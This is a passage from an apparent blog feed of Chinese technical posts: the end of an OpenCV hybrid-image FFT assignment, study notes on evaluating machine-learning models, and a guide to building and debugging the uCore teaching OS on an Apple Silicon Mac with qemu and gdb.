class="hljs-title">fftshift</span><span class="hljs-params">(Mat&amp; output0, Mat&amp; output1)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// 以下的操作是移动图像  (零频移到中心)</span><span class="hljs-type">int</span> cx = output0.cols / <span class="hljs-number">2</span>;<span class="hljs-type">int</span> cy = output0.rows / <span class="hljs-number">2</span>;<span class="hljs-function">Mat <span class="hljs-title">part1_r</span><span class="hljs-params">(output0, Rect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, cx, cy))</span></span>;  <span class="hljs-comment">// 元素坐标表示为(cx, cy)</span><span class="hljs-function">Mat <span class="hljs-title">part2_r</span><span class="hljs-params">(output0, Rect(cx, <span class="hljs-number">0</span>, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part3_r</span><span class="hljs-params">(output0, Rect(<span class="hljs-number">0</span>, cy, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part4_r</span><span class="hljs-params">(output0, Rect(cx, cy, cx, cy))</span></span>;Mat temp;part1_r.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//左上与右下交换位置(实部)</span>part4_r.<span class="hljs-built_in">copyTo</span>(part1_r);temp.<span class="hljs-built_in">copyTo</span>(part4_r);part2_r.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//右上与左下交换位置(实部)</span>part3_r.<span class="hljs-built_in">copyTo</span>(part2_r);temp.<span class="hljs-built_in">copyTo</span>(part3_r);<span class="hljs-function">Mat <span class="hljs-title">part1_i</span><span class="hljs-params">(output1, Rect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, cx, cy))</span></span>;  <span class="hljs-comment">//元素坐标(cx,cy)</span><span class="hljs-function">Mat <span class="hljs-title">part2_i</span><span class="hljs-params">(output1, Rect(cx, <span class="hljs-number">0</span>, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part3_i</span><span class="hljs-params">(output1, Rect(<span class="hljs-number">0</span>, cy, cx, cy))</span></span>;<span class="hljs-function">Mat <span class="hljs-title">part4_i</span><span class="hljs-params">(output1, Rect(cx, cy, cx, cy))</span></span>;part1_i.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//左上与右下交换位置(虚部)</span>part4_i.<span class="hljs-built_in">copyTo</span>(part1_i);temp.<span class="hljs-built_in">copyTo</span>(part4_i);part2_i.<span class="hljs-built_in">copyTo</span>(temp);  <span class="hljs-comment">//右上与左下交换位置(虚部)</span>part3_i.<span class="hljs-built_in">copyTo</span>(part2_i);temp.<span class="hljs-built_in">copyTo</span>(part3_i);}</code></pre></div></div><p>之后按照公式进行高斯滤波即可。取高频信号时可以直接将高斯滤波器翻转。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1kpmk4lmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-1kpmk4lmrh9u64"><pre><code class="hljs C++"><span class="hljs-function">Mat <span class="hljs-title">gaussianBlur</span><span class="hljs-params">(test.size(), CV_32FC1)</span></span>; <span class="hljs-comment">//，CV_32FC1</span><span class="hljs-keyword">if</span> (is_high){    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; test.rows; i++) {        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; test.cols; j++) {            <span class="hljs-type">float</span> d = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(i - test.rows / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(j - test.cols / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>);            gaussianBlur.<span class="hljs-built_in">at</span>&lt;<span class="hljs-type">float</span>&gt;(i, j) = <span class="hljs-number">1</span> - <span class="hljs-built_in">expf</span>(-d / (<span class="hljs-number">2</span> * sigma * sigma));        }    }}<span class="hljs-keyword">else</span> {    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; test.rows; i++) {        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; test.cols; j++) {            <span class="hljs-type">float</span> d = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(i - test.rows / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">float</span>(j - test.cols / <span class="hljs-number">2</span>), <span class="hljs-number">2</span>);            gaussianBlur.<span class="hljs-built_in">at</span>&lt;<span class="hljs-type">float</span>&gt;(i, j) = <span class="hljs-built_in">expf</span>(-d / (<span class="hljs-number">2</span> * sigma * sigma));        }    }}</code></pre></div></div><p>得到高斯滤波器后对图片进行过滤，实部虚部分别与滤波器模板对应元素相乘。最后还要进行逆变换，归一化，得到最终滤波图像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ljlmt9lmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-ljlmt9lmrh9u64"><pre><code class="hljs C++">Mat blur_r, blur_i, blur_full;<span class="hljs-built_in">multiply</span>(output[<span class="hljs-number">0</span>], gaussianBlur, blur_r);<span class="hljs-built_in">multiply</span>(output[<span class="hljs-number">1</span>], gaussianBlur, blur_i);Mat blur_split[] = { blur_r, blur_i };<span class="hljs-built_in">fftshift</span>(blur_split[<span class="hljs-number">0</span>], blur_split[<span class="hljs-number">1</span>]);<span class="hljs-built_in">merge</span>(blur_split, <span class="hljs-number">2</span>, blur_full);<span class="hljs-built_in">idft</span>(blur_full, blur_full);blur_full = blur_full / blur_full.rows / blur_full.cols; <span class="hljs-comment">// 归一化</span><span class="hljs-built_in">split</span>(blur_full, output);output[<span class="hljs-number">0</span>] = output[<span class="hljs-number">0</span>] / <span class="hljs-number">255</span>;</code></pre></div></div><p>我们还可以将离散傅里叶变换得到的结果转换成幅值矩阵展示出来:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-151t4hlmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-151t4hlmrh9u64"><pre><code class="hljs C++">Mat amplitude;<span class="hljs-built_in">magnitude</span>(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>], amplitude);amplitude = amplitude + Scalar::<span class="hljs-built_in">all</span>(<span class="hljs-number">1</span>);<span class="hljs-built_in">log</span>(amplitude, amplitude);<span class="hljs-built_in">normalize</span>(amplitude, amplitude, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, NORM_MINMAX);<span class="hljs-built_in">imshow</span>(text, amplitude);</code></pre></div></div><p>一般来说，低频的信号幅值大，组成一个信号的基本面，高频的信号幅值小，刻画细节、轮廓。</p><p>对傅里叶变换及应用的粗浅理解参照了<a href="https://juejin.cn/post/7188914545476239418">这里</a>。</p><h3 id="结果展示">结果展示</h3><p>使用OpenCV附带的Trackbar功能实现了自动调节截止频率的功能。展示如下:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210857054735_334_20230329204718785139_962_image-20230329110649015.png" alt="image-20230329110649015" width="67%" height="67%"></p><p>可以看到<span class="math inline">\(\sigma=16\)</span>时能够取得较好的混合效果。</p><p>得到两个图片的幅值矩阵如下所示:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210858221680_112_20230329204722119165_954_image-20230329112108249.png" alt="image-20230329112108249" width="67%" height="67%"></p><p>换用自己喜欢的图像尝试一下:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210859490938_460_20230329204725159317_763_image-20230329112218382.png" alt="image-20230329112218382" width="67%" height="67%"></p><p>因为这两张图片都不存在明显的高频信号，因此不是一个很好的样例。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机视觉</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习-模型评估与选择</title>
    <link href="/posts/4810/"/>
    <url>/posts/4810/</url>
    
    <content type="html"><![CDATA[<h2 id="模型评估与选择">模型评估与选择</h2><h3 id="模型评估方法">模型评估方法</h3><p>书后习题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205809208213_235_20220930234157710423_473_image-20220930231043281.png" alt="image-20220930231043281"><figcaption aria-hidden="true">image-20220930231043281</figcaption></figure><h3 id="经验误差和泛化误差">经验误差和泛化误差</h3><h4 id="定义">定义</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205812256325_334_20220930234159328307_660_image-20220930140833923.png" alt="image-20220930140833923"><figcaption aria-hidden="true">image-20220930140833923</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205813431862_658_20220930234200690193_368_image-20220930141041690.png" alt="image-20220930141041690"><figcaption aria-hidden="true">image-20220930141041690</figcaption></figure><h4 id="解决过拟合现象正则化">解决过拟合现象：正则化</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205815454555_696_20220930234202870906_724_image-20220930141142762.png" alt="image-20220930141142762"><figcaption aria-hidden="true">image-20220930141142762</figcaption></figure><h3 id="性能度量">性能度量</h3><h4 id="基本概念">基本概念</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205818125789_846_20220930234204833875_372_image-20220930163038120.png" alt="image-20220930163038120"><figcaption aria-hidden="true">image-20220930163038120</figcaption></figure><h4 id="p-r曲线和roc曲线">P-R曲线和ROC曲线</h4><h5 id="实例">实例</h5><p><a href="https://zhuanlan.zhihu.com/p/92218196">知乎</a>上有一个案例对这些曲线描述的比较形象。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205819444654_648_20220930234208101296_478_image-20220930194835021.png" alt="image-20220930194835021"><figcaption aria-hidden="true">image-20220930194835021</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205820611781_176_20220930234209475943_307_image-20220930194858579.png" alt="image-20220930194858579"><figcaption aria-hidden="true">image-20220930194858579</figcaption></figure><p>TPR真阳性，FPR假阳性</p><p>一个表现平平的分类器(表现是指分类标准能否将两种样本有效的分开，而threshold是指划分标准更倾向于查全率或准确率)</p><p align="center"><img alt="image-20220927211547461" height="" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205821765720_481_20220930234211807031_249_norm.gif" width=""></p>一个更好一些的分类器<p align="center"><img alt="image-20220927211547461" height="" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205824598151_175_20220930234215190380_315_norm2.gif" width=""></p><p>F1计算</p><p align="center"><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205826410667_477_20220930234218188978_486_F1.gif" width="" hight=""></p><h5 id="用途">用途</h5><p>基于P-R曲线可以大致评判机器学习模型的好坏</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205828242463_385_20220930234219845677_195_image-20220930224302678.png" alt="image-20220930224302678"><figcaption aria-hidden="true">image-20220930224302678</figcaption></figure><p>ROC也是如此。</p><p>从定义可知， AUC 可 通过对 ROC 曲 线下各部分的面积 求和而得.</p><p>形式化地看， AUC 考虑的是样本预测的排序质量。</p><p>习题：若学习器A的F1值比学习器B高，试析A的BEP值是否也比B高</p><p>二者是不同维度的指标。当然在达到BEP的条件时(P=R)，F1的值和BEP相等。</p><h4 id="roc代价曲线">ROC代价曲线</h4><p>参考<a href="https://www.zhihu.com/question/63492375">知乎答案</a></p><p>首先, 横坐标是 <span class="math inline">\(\mathrm{P}(+)\)</span>,由公式3可以知道, 当 <span class="math inline">\(\mathrm{P}(+)=0\)</span>时, <span class="math inline">\({c o s t}_{n o rm}=\mathrm{FPR}\)</span>; 当 <span class="math inline">\(\mathrm{P}(+)=1\)</span> 时, <span class="math inline">\(\operatorname{cost}_{n o rm}=\mathrm{FNR}_{\circ}\)</span> 直白含义：当我用来检测模型好坏的样本全是负例(即 $(+)=0 $)，那我模型产生的错误就只有负例被错误的预测 为正例这一种情况, 就是 <span class="math inline">\((0, F P R)\)</span> 。 同样,当我用来检测模型好坏的样本全都是正例（即 $(+)=1 $)，那我模型产生的错误就只有正例被错 误的预测为负例的情况这一种情况，就是<span class="math inline">\((1, \mathrm{FNR})\)</span>两个连线中间的情况, 用来检测模型的样本有正例也有负例的时候, 也就是 <span class="math inline">\(P(+)=0 . x\)</span>, 这时候 <span class="math inline">\(\operatorname{cost}_{n o r m}\)</span>的取值就会同时受到FPR和FNR的影响。</p><p>很像高中化学读图题的定性分析：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205830154968_899_20220930234221742723_477_image-20220930222355725.png" alt="image-20220930222355725"><figcaption aria-hidden="true">image-20220930222355725</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205831728167_536_20220930234223625316_668_image-20220930222637642.png" alt="image-20220930222637642"><figcaption aria-hidden="true">image-20220930222637642</figcaption></figure><p>就像做核酸”粉饰太平“一样( <span class="math display">\[P(+)=\frac{p \cdot \cos _{0 \mid 1}}{p \cdot \operatorname{cost}_{0 \mid1}+(1-p) \cdot \operatorname{cost}_{1 \mid 0}}\]</span> <span class="math inline">\(\operatorname{cost}_{0 \mid1}\)</span> 表示: 实际为正类, 而错判成负类的代价, <span class="math inline">\(\operatorname{cost}_{1 \mid 0}\)</span> 表示:实际为负类, 而错判成正类类Q 的代价。 举例说明, 当我们认为,正例错判为负例的代价与负例错判为正例的代价相同时, <span class="math inline">\(P^1(+)=p\)</span>当我们认为把正类判定为负类会造成更大的损失时(比如假设核酸检测瞒报比误报代价更大),此时 <span class="math inline">\(\operatorname{cost}_{1 \mid 0}&gt;;\cost_{0 \mid 1}\)</span>, 带入正例代价公式 得 <span class="math inline">\(P^2(+)\)</span>, 这时候就有 <span class="math inline">\(P^2(+)&gt;;P^1(+)\)</span> 。 对应到ROC代价图,正例概率 <span class="math inline">\(P(+)\)</span> 就会往左移动,对应的阈值就会减小, 模型对负类的判断就会更谨慎(比如下调CT值)。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205832760860_905_20220930234224685263_266_image-20220930142416369.png" alt="image-20220930142416369"><figcaption aria-hidden="true">image-20220930142416369</figcaption></figure><p><span class="math inline">\(\beta\)</span>&gt;1时查全率有更大影响；<span class="math inline">\(\beta\)</span>&lt;1时查准率有更大影响。</p><p>(核酸检测评价假设偏向减少瞒报，则<span class="math inline">\(\beta&gt;1\)</span>)</p><h3 id="比较检验">比较检验</h3><p>单边t检验和成对t检验可以分别用于评价单个学习器的错误率和比较两个学习器的性能。</p><p>对二分类问题，使用留出法不仅可估计出学习器 A 和 B的测试错误率，还可获得两学习器分类结果的差别，使用McNemar检验可以做到。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205834083424_981_20220930234226080145_532_image-20220930233428713.png" alt="image-20220930233428713"><figcaption aria-hidden="true">image-20220930233428713</figcaption></figure><p>$Min-max$规范化优点：1、计算相对简单一点。2、当新样本进来时，只有在新样本大于原最大值或者小于原最小值时，才需要重新计算规范化之后的值。缺点在于：1、容易受高杠杆点和离群点影响。</p><p><span class="math inline">\(z-score\)</span>规范化优点：1、对异常值敏感低。缺点在于：1、计算更负责。2、每次新样本进来都需要重新计算规范化。</p><h3 id="偏差方差分解">偏差方差分解</h3><p>用途：解释算法泛化性能来源的手段 <span class="math display">\[E(f ;D)=\operatorname{bias}^2(\boldsymbol{x})+\operatorname{var}(\boldsymbol{x})+\varepsilon^2,\]</span> 也就是说, 泛化误差可分解为偏差、方差与噪声之和。</p><p>注意这个式子的推导，详见南瓜书。</p><ul><li><strong>「偏差」</strong>度量了学习算法的期望预测与真实结果的偏离程度，即<strong>「刻画了学习算法本身的拟合能力」</strong>；</li><li><strong>「方差」</strong>度量了同样大小的训练集的变动所导致的学习性能的变化，即<strong>「刻画了数据扰动所造成的影响」</strong>;</li><li><strong>「噪声」</strong>则表达了在当前任务上任何学习算法所能达到的期望泛化误差的下界，即<strong>「刻画了学习问题本身的难度」</strong>.</li></ul><p>偏差一方差分解说明，泛化性能是由<strong>「学习算法的能力」</strong>、<strong>「数据的充分性」</strong>以及<strong>「学习任务本身的难度所共同决定」</strong>的。</p><p align="center"><img alt="image-20220930230353084" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/20230828205835267931_997_20220930234228241789_843_image-20220930230353084.png" width="50%"></p><p>随训练强度，偏差减小，方差增大，即学习的越充分，但受数据影响越大，可能出现过拟合现象。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ucore Lab0 on Apple Silicon Mac</title>
    <link href="/posts/23191/"/>
    <url>/posts/23191/</url>
    
    <content type="html"><![CDATA[<h2 id="ucore-lab0-on-apple-silicon-mac">Ucore Lab0 on Apple SiliconMac</h2><h3 id="介绍">介绍</h3><p>M1芯片是2020年之后推出的全新适配于Macbook的Arm64芯片。因为底层的指令集与x86_64不同，因此面临着很多兼容性的问题。在ucore的编译，运行和调试的环境配置中也因此踩了一些坑。当然最终得以能够优雅的在这台具有独特架构的PC上探索实现操作系统的魅力。</p><p>现在将其记录下来，以供参考。</p><h3 id="qemu安装">qemu安装</h3><p>qemu是非常成熟的虚拟化解决方案，通过软件的方式逐条将目标文件的二进制指令翻译成目标架构支持的二进制指令，虽然效率不高，但是使用方便，对M1芯片支持也比较完善，足够用来调试ucore了。</p><p>指导书中针对linux给出了使用包管理工具的安装方案。在mac上这个过程也同样比较简单。安装<code>homebrew</code>包管理工具后只需要</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-701ux8lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-701ux8lmrh9u65"><pre><code class="hljs shell">brew install qemu</code></pre></div></div><p>即可。当然为了保证是最新版本，安装之前可以更新一下homebrew：<code>brew update</code>。</p><h3 id="i386-elf-gcc和i386-elf-gdb安装">i386-elf-gcc和i386-elf-gdb安装</h3><p>按照网上的解决方案，我安装了<code>macport</code>，并</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oakd40lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-oakd40lmrh9u65"><pre><code class="hljs shell">sudo port -v selfupdatesudo port install i386-elf-gcc</code></pre></div></div><p>但是发现它安装过程中构建失败了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210509161934_583_20221003231400206876_223_image-20221003224714488.png" alt="image-20221003224714488"><figcaption aria-hidden="true">image-20221003224714488</figcaption></figure><p>查看发现果然是架构问题：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210510441170_930_20221003231401953713_177_image-20221003224809467.png" alt="image-20221003224809467"><figcaption aria-hidden="true">image-20221003224809467</figcaption></figure><p>查看报错信息。谷歌后从<a href="https://github.com/riscv-collab/riscv-gnu-toolchain/issues/800">githubissue</a>中得知是有支持apple silicon版本的最新i386-elf-gcc的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210511905247_542_20221003231403860364_202_image-20221003225239013.png" alt="image-20221003225239013"><figcaption aria-hidden="true">image-20221003225239013</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210513865427_993_20221003231405125684_549_image-20221003225245971.png" alt="image-20221003225245971"><figcaption aria-hidden="true">image-20221003225245971</figcaption></figure><p>有希望！但是按官网命令安装问题也没有解决，所谓补丁也不起效。后来尝试用homebrew安装：<code>brew install i386-elf-gdb</code>，但没有安装成功。提示</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-of6sdflmrh9u65"></i><span>awk</span><div class="collapse show" id="collapse-of6sdflmrh9u65"><pre><code class="hljs awk">fatal: not <span class="hljs-keyword">in</span> a git directory Error: Command failed with <span class="hljs-keyword">exit</span> <span class="hljs-number">128</span>: git</code></pre></div></div><p>又经过一番谷歌找到了<a href="https://www.jianshu.com/p/07243d214abd">解决方法</a>。执行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9bvc04lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-9bvc04lmrh9u65"><pre><code class="hljs shell">git config --global --add safe.directory 报错信息中homebrew-core路径git config --global --add safe.directory 报错信息中homebrew-cask路径</code></pre></div></div><p>即可。</p><p>然后需要添加一下环境变量。</p><p>这时尝试qemu生成ucore的dmg，发现提示<code>i386-elf-gcc</code>找不到。这才注意到通过homebrew下载的是<code>x86_64-elf-gcc</code>。</p><p>经过搜索，得知在make时需要添加<code>make GCCPREFIX=x86_64-elf-</code>指定交叉编译工具。这时可以高兴的看到控制台闪烁，执行也很顺利。</p><h3 id="执行">执行</h3><p>然后<code>make qemu</code>执行的过程也比较顺利。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210515089897_183_20221003231407841829_266_image-20221003230427926.png" alt="image-20221003230427926"><figcaption aria-hidden="true">image-20221003230427926</figcaption></figure><h3 id="调试">调试</h3><p>首先，ARM架构的Mac目前是不能使用<code>gdb</code>进行程序的调试的，默认的调试工具是<code>lldb</code>。然而经过查阅，对于交叉编译反而可以使用实验中对应的<code>gdb</code>工具：运行<code>brew install i386-elf-gdb</code>安装即可。</p><p>以调试lab1中的BIOS的执行为例。</p><p>下面的过程与指导书中“使用远程调试”部分类似。除此之外，额外将运行的汇编指令保存在q.log中。</p><p>在一个终端先执行：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p6e0d8lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-p6e0d8lmrh9u65"><pre><code class="hljs shell">qemu-system-i386 -S -s -d in_asm -D bin/q.log -monitor stdio -hda bin/ucore.img</code></pre></div></div><p>后在另一个终端执行:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i869fplmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-i869fplmrh9u65"><pre><code class="hljs shell">i386-elf-gdb</code></pre></div></div><p>进入gdb调试界面。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9u4rjelmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-9u4rjelmrh9u65"><pre><code class="hljs shell">(gdb) file bin/kernelReading symbols from bin/kernel...(gdb) target remote :1234Remote debugging using :12340x0000fff0 in ?? ()</code></pre></div></div><p>上述的过程相比原来<code>makrfile</code>中提供的<code>make debug</code>主要有两个好处：一是能够重定向到<code>q.log</code>方便进行对比；二是可以绕开<code>make</code>中的<code>TERMINAL:=gnome-terminal</code>(<code>gnome-terminal</code>仅在linux下可使用)</p><p>查看 CS:EIP 由于此时在实际模式下 CPU 在加电后执行的第一条指令的地址为0xf000:0xfff0 =&gt; 0xffff0</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kdttq2lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-kdttq2lmrh9u65"><pre><code class="hljs shell">(gdb) x/i $cs0xf000:add    %al,(%eax)(gdb) x/i $eip0xfff0:add    %al,(%eax)</code></pre></div></div><p>再来看看这个地址的指令是什么 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nf6vemlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-nf6vemlmrh9u65"><pre><code class="hljs shell">(gdb) x/2i 0xffff0   0xffff0:ljmp   $0x3630,$0xf000e05b   0xffff7:das</code></pre></div></div><p></p><p>可以看到 第一条指令执行完以后 会跳转到<code>0xf000e05b</code>也就是说BIOS 开始的地址是 <code>0xfe05b</code>。</p><p>打上断点</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rfi41wlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-rfi41wlmrh9u65"><pre><code class="hljs shell">(gdb) b *0x7c00Breakpoint 1 at 0x7c00(gdb) cContinuing.Breakpoint 1, 0x00007c00 in ?? ()</code></pre></div></div><p>一开始为了方便后续在终端中配置了永久别名：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4xtlzelmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-4xtlzelmrh9u65"><pre><code class="hljs shell">alias makeq="make GCCPREFIX=x86_64-elf-"</code></pre></div></div><p>当然更优雅的方法其实是修改make中的宏：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dok93dlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-dok93dlmrh9u65"><pre><code class="hljs makefile"><span class="hljs-comment"># try to infer the correct GCCPREFX</span><span class="hljs-keyword">ifndef</span> GCCPREFIX<span class="hljs-comment"># GCCPREFIX := $(shell if i386-elf-objdump -i 2&gt;&amp;1 | </span><span class="hljs-comment">#...comment the original shell function</span><span class="hljs-comment"># echo "***" 1&gt;&amp;2; exit 1; fi)</span>GCCPREFIX := x86_64-elf-<span class="hljs-keyword">endif</span></code></pre></div></div><p>但是，由于<code>makefile</code>里默认认为调试工具一定叫<code>gdb</code>，且mac里没有gdb对应的command，因此这时候用永久别名是比较合适的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dzpd3slmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-dzpd3slmrh9u65"><pre><code class="hljs shell">alias gdb="i386-elf-gdb"</code></pre></div></div><p>这时候也可以修改make来达到自动化调试的目的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" 